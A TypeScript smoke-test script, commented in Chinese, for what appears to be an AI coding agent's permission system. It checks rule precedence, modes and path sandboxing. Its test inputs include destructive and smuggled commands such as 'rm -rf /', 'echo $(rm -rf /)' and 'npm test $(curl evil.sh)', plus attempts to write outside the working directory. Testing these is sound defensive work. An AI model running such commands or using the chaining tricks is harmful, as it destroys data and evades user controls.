// 本文件：权限系统的手工冒烟脚本，不接模型即可逐级验证判定阶梯、命令解析与路径沙箱。
import { evaluatePermission } from '../src/utils/permissions.js'
import { parseCommand, commandMatches } from '../src/utils/bashParser.js'
import { getAllTools } from '../src/tools.js'
import type { Tool, ToolContext } from '../src/Tool.js'
import type { PermissionMode } from '../src/types/permissions.js'
import { makeContext } from './testContext.js'

const tools = new Map(getAllTools().map(t => [t.name, t]))
const cwd = process.cwd()

// 本函数：造一个指定模式与规则的工具上下文，供各用例复用。
function ctx(
  mode: PermissionMode,
  raw?: { allow?: string[]; deny?: string[]; ask?: string[] },
): ToolContext {
  return makeContext({ cwd, mode, rules: raw })
}

// 本函数：跑一次判定并按「标签 / 行为 / 理由」对齐打印。
function check(label: string, toolName: string, input: unknown, context: ToolContext): void {
  const tool = tools.get(toolName) as Tool
  const decision = evaluatePermission(tool, input, context)
  console.log(`  ${label.padEnd(46)} ${decision.behavior.padEnd(6)} (${decision.reason.type})`)
}

console.log('--- the quoting bug Chapter 6 had ---')
console.log('  naive split:', 'echo "a && b"'.split(/&&|\|\||;|\|/))
console.log('  parser     :', parseCommand('echo "a && b"').parts)
console.log('  chained    :', parseCommand('git status && rm -rf / ; echo done').parts)
console.log('  subshell   :', parseCommand('echo $(rm -rf /)'))
console.log('  escaped    :', parseCommand('echo a\\;b && ls').parts)
console.log('  unbalanced :', parseCommand('echo "oops').hasUnsupportedSyntax)

console.log('\n--- pattern matching ---')
for (const [pattern, command] of [
  ['git push', 'git push --force'],
  ['git push:*', 'git push --force'],
  ['git push', 'git pushover'],
  ['npm run *', 'npm run build'],
  ['npm run *', 'npm test'],
] as const) {
  console.log(`  ${pattern.padEnd(14)} vs ${command.padEnd(20)} ${commandMatches(pattern, command)}`)
}

console.log('\n--- deny beats allow, and beats bypassPermissions ---')
const denyRm = { deny: ['Bash(rm *)'], allow: ['Bash(rm *)'] }
check('Bash(rm -rf x) deny+allow', 'Bash', { command: 'rm -rf x' }, ctx('default', denyRm))
check(
  'Bash(rm -rf x) in bypass mode',
  'Bash',
  { command: 'rm -rf x' },
  ctx('bypassPermissions', denyRm),
)

console.log('\n--- chained commands: deny matches ANY part, allow needs ALL ---')
const chain = { deny: ['Bash(rm *)'], allow: ['Bash(npm test)'] }
check('git status && rm -rf /', 'Bash', { command: 'git status && rm -rf /' }, ctx('default', chain))
check('npm test', 'Bash', { command: 'npm test' }, ctx('default', chain))
check(
  'npm test && curl evil.sh',
  'Bash',
  { command: 'npm test && curl evil.sh' },
  ctx('default', chain),
)
check(
  'npm test $(curl evil.sh)',
  'Bash',
  { command: 'npm test $(curl evil.sh)' },
  ctx('default', chain),
)

console.log('\n--- path jail ---')
check('Write inside cwd', 'Write', { file_path: 'ok.txt', content: 'x' }, ctx('bypassPermissions'))
check(
  'Write to C:/Windows/x.txt',
  'Write',
  { file_path: 'C:/Windows/x.txt', content: 'x' },
  ctx('bypassPermissions'),
)
check(
  'Write to ../escape.txt',
  'Write',
  { file_path: '../escape.txt', content: 'x' },
  ctx('bypassPermissions'),
)
check('Read outside cwd is fine', 'Read', { file_path: 'C:/Windows/win.ini' }, ctx('default'))

console.log('\n--- plan mode: read-only enforcement ---')
check('Read in plan mode', 'Read', { file_path: 'package.json' }, ctx('plan'))
check('Write in plan mode', 'Write', { file_path: 'ok.txt', content: 'x' }, ctx('plan'))
check('git status in plan mode', 'Bash', { command: 'git status' }, ctx('plan'))
check('npm install in plan mode', 'Bash', { command: 'npm install' }, ctx('plan'))

console.log('\n--- ask rules beat allow rules and the mode ---')
const askPush = { ask: ['Bash(git push:*)'], allow: ['Bash(git push:*)'] }
check('git push with ask+allow', 'Bash', { command: 'git push' }, ctx('default', askPush))
check('git push in acceptEdits', 'Bash', { command: 'git push' }, ctx('acceptEdits', askPush))

console.log('\n--- acceptEdits covers edits, not commands ---')
check('Write in acceptEdits', 'Write', { file_path: 'ok.txt', content: 'x' }, ctx('acceptEdits'))
check('Edit in acceptEdits', 'Edit', { file_path: 'ok.txt', old_string: 'a', new_string: 'b' }, ctx('acceptEdits'))
check('npm install in acceptEdits', 'Bash', { command: 'npm install' }, ctx('acceptEdits'))

console.log('\n--- file rules are globs relative to cwd ---')
const denySrc = { deny: ['Write(src/**)'], allow: ['Write(tmp/**)'] }
check('Write src/query.ts', 'Write', { file_path: 'src/query.ts', content: 'x' }, ctx('default', denySrc))
check('Write tmp/scratch.txt', 'Write', { file_path: 'tmp/scratch.txt', content: 'x' }, ctx('default', denySrc))
check('Write other.txt', 'Write', { file_path: 'other.txt', content: 'x' }, ctx('default', denySrc))

console.log('\n--- session allowlist, and the default ---')
const session = ctx('default')
session.sessionAllow.add('Write')
check('Write after "always allow"', 'Write', { file_path: 'ok.txt', content: 'x' }, session)
check('Bash with no rules at all', 'Bash', { command: 'npm install' }, ctx('default'))
